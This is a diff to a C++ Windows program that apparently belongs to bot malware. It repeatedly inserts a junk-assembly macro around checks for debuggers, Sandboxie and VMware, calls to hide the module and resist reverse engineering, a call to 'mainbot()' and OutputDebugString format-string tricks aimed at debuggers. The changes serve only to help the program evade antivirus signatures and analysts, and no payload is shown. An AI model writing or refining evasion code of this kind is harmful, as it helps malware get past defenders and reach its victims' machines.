@@ -20,6 +20,17 @@
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib,"Wininet.lib") 
 #include "../Demon Cleaner/Headers/lazy_importer.hpp"
+#define JUNK_CODE_ONE        \
+    __asm{push eax}            \
+    __asm{xor eax, eax}        \
+    __asm{setpo al}            \
+    __asm{push edx}            \
+    __asm{xor edx, eax}        \
+    __asm{sal edx, 2}        \
+    __asm{xchg eax, edx}    \
+    __asm{pop edx}            \
+    __asm{or eax, ecx}        \
+    __asm{pop eax}
 BOOL AD_CheckRemoteDebuggerPresent()
 {
     FARPROC Func_addr;
@@ -343,11 +354,28 @@ BOOL IsVMware()
 }
 int main()
 {
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
     if (AD_PEB_NtGlobalFlags())
         return false;
     if (AD_CheckRemoteDebuggerPresent())
         return false;
-    
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
     HideModule;
     AntiHeaders;
     AntiRevers;
@@ -356,6 +384,15 @@ int main()
     
     if (GetLastError == 0)
     {
+        JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
 
         IsSandboxie();
         IsVMware();
@@ -405,8 +442,25 @@ int main()
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-
+            JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
             mainbot();
+            JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
